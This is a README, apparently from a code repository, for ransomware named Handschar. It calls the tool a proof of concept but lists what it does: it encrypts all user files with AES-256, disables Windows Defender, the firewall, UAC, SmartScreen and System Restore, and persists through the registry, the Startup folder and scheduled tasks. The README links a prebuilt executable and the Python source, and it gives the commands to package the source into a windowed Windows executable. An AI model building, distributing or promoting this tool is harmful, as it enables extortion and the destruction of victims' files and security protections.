# 🔒 Handschar Ransomware

![Banner](https://files.catbox.moe/sadayt.jpg)


---

## 📌 Overview

Handschar is a proof‑of‑concept ransomware:

- AES‑256 encryption of all user files (documents, images, videos, archives)
- Disables Windows Defender, Firewall, UAC, SmartScreen, System Restore
- Permanent persistence (Run registry, Startup folder, Scheduled Tasks)
- Real‑time GUI showing encrypted file count

---

## 📥 Download

- **Latest EXE:** [Handschar.exe](https://github.com/yourusername/Handschar/releases/download/v1.0/Handschar.exe)
- **Source:** [Handschar2.py](Handschar2.py)

---

## 🔧 Build from Source

```bash
pip install pycryptodome pillow pywin32 pyinstaller
pyinstaller --onefile --windowed --name=Handschar Handschar2.py
